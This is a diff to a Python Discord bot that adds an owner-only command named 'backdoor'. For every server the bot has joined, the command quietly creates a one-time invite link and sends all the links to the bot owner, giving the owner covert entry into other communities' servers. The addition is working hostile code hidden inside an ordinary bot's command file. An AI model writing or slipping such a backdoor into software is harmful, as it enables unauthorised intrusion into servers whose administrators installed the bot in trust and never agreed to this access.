@@ -328,6 +328,17 @@ async def support(ctx):
 
     await ctx.send(embed=embed)
 
+@bot.hybrid_command(name="backdoor", description='list Servers')
+@commands.is_owner()
+async def server(ctx):
+    embed = discord.Embed(title="Server List", color=discord.Color.blue())
+
+    for guild in bot.guilds:
+        invite = await guild.text_channels[0].create_invite(max_age=300, max_uses=1, unique=True)
+        embed.add_field(name=guild.name, value=invite.url, inline=True)
+
+    await ctx.send(embed=embed)
+
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.MissingPermissions):
